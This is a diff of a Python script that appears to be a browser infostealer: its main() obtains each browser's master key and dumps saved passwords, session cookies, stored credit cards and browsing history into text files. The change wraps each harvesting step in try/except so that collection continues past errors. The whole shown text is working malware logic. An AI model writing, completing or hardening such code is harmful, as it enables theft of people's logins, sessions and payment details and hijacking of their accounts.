@@ -190,14 +190,26 @@ def main():
         master_key = get_master_key(browser_path)
         if master_key:
             print(f"Master Key Found for {browser_name}!")
-            save_results(browser_name, "Saved_Passwords",
-                         get_login_data(browser_path, "Default", master_key))
-            save_results(browser_name, "Browser_Cookies",
-                         get_cookies(browser_path, "Default", master_key))
-            save_results(browser_name, "Saved_Credit_Cards",
-                         get_credit_cards(browser_path, "Default", master_key))
-            save_results(browser_name, "Browser_History",
+            try:
+                save_results(browser_name, "Saved_Passwords",
+                            get_login_data(browser_path, "Default", master_key))
+            except Exception as e:
+                print(f"Error: {e}")
+            try:
+                save_results(browser_name, "Browser_Cookies",
+                            get_cookies(browser_path, "Default", master_key))
+            except Exception as e:
+                print(f"Error: {e}")
+            try:
+                save_results(browser_name, "Saved_Credit_Cards",
+                            get_credit_cards(browser_path, "Default", master_key))
+            except Exception as e:
+                print(f"Error: {e}")
+            try:
+                save_results(browser_name, "Browser_History",
                          get_web_history(browser_path, "Default"))
+            except Exception as e:
+                print(f"Error: {e}")
 
             file_paths.extend([
                 f"{browser_name}/{data_type}.txt" for data_type in [
